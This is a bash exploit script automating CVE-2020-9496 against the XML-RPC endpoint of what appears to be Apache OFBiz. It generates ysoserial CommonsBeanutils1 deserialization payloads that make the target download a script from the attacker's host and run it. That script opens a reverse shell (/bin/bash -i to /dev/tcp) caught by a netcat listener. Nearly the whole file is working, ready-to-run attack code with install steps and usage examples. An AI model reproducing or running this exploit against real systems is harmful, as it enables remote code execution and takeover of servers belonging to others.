#!/bin/bash

#####################################################
# Creator : RistBS
#
# Description : un script bash automatise* pour
# l'exploitation de CVE-2020-9496.
#
# + : it is my first bash script :D
#####################################################
#
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
SCRIPT_DIR=$SCRIPT_DIR/resources
LHOST=$1
LPORT=$2
LISTENER=$3
RHOST=$4

red="\e[0;91m"
blue="\e[0;34m"
reset="\e[0m"
green="\e[0;32m"



if [ -z $1 ]; then
	echo "[-] - LHOST IP WAS NOT SET"*
elif [ -z $2 ]; then
	echo "[-] - LPORT WAS NOT SET"
    echo ""
else
echo "
#!/bin/bash
/bin/bash -i >& /dev/tcp/$1/$2 0>&1 " > shell.sh
fi

if [ "$3" == "--listener" ]; then
   echo "Set listener on $2"
   echo -e "$green waiting for connection... $reset"
   echo ""
   echo -e "$red----------------------------------------------------------------------------------- $reset"
   echo -e "$red make sure u do do this in three different terminal, one for injection $reset"
   echo -e "$red       one for the web server and one to intercept the connection. $reset"
   echo -e "$red----------------------------------------------------------------------------------- $reset"
   echo ""
   echo ""
   echo ""
   nc -lnvp $2
elif [ "$3" == "--web" ]; then
   python3 -m http.server 80
fi

if [ "$1" == "--install" ]; then
CWD=$(pwd)
echo -e "${green}------INSTALLATION DEPENDENCIES AND TOOLS------${reset}"
echo -e "${blue}INSTALLING ysoserial...${reset}"
wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar #-O $CWD
mv ysoserial-master-SNAPSHOT.jar ysoserial.jar
echo -e "${red}DONE !!!${reset}"
echo -e "${blue} INSTALLING xclip...${reset}"
apt install xclip -y
echo -e "${red}DONE !!!${reset}"
exit
fi

if [ "$1" == "--help" ]; then
echo -e " $red [!] Split your terminal ! , one for injection, one for the web server and one to intercept the connection. $reset"
echo "
Options : commands    description
          --------    ------------
          LHOST    >  ex: 192.168.1.30

          LPORT    >  ex: 333

          RHOST    >  ex: 127.0.0.1 ( default port is 8443 )

          --install : install packages 
          --inject : inject serialized payload 
          --web : start web server
          --listener : start listener 

      exploit exemple : ./exploit.sh 192.168.1.30 333 --inject 127.0.0.1
      listener exemple : ./exploit.sh 192.168.1.30 333 --listener
      [!] make sure you type the lhost before the lport for exploit part ! 
	   "
fi

if [ -z $4 ]; then
	echo "[-] - RHOST IP WAS NOT SET"*
elif [ "$3" == "--inject" ]; then
serial=$(java -jar ysoserial.jar CommonsBeanutils1 "wget $1/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n")
echo $serial
curl https://$4:8443/webtools/control/xmlrpc -X POST -v -d '<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">'${serial}'</serializable></value></member></struct></value></param></params></methodCall>' -k  -H 'Content-Type:application/xml'
serialtwo=$(java -jar ysoserial.jar CommonsBeanutils1 "bash /tmp/shell.sh" | base64 | tr -d "\n")
echo $serialtwo 
curl https://$4:8443/webtools/control/xmlrpc -X POST -v -d '<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">'${serialtwo}'</serializable></value></member></struct></value></param></params></methodCall>' -k  -H 'Content-Type:application/xml'
fi

#CONDITION FONCTION :







###

### " 




#----------------------------------TEST PART--------------------------------------------------------------
#$5=ysoserial CommonsBeanutils1 "wget $1/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n"
#xclip DESERILIZATION

#$7=test
#curl https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -v -d "<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">$1</serializable></value></member></struct></value></param></params></methodCall>' -k  -H 'Content-Type:application/xml"

#curl https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -v -d '<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">$7</serializable></value></member></struct></value></param></params></methodCall>' -k  -H 'Content-Type:application/xml'
#curl https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -v -d '<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions"></serializable></value></member></struct></value></param></params></methodCall>' -k  -H 'Content-Type:application/xml'
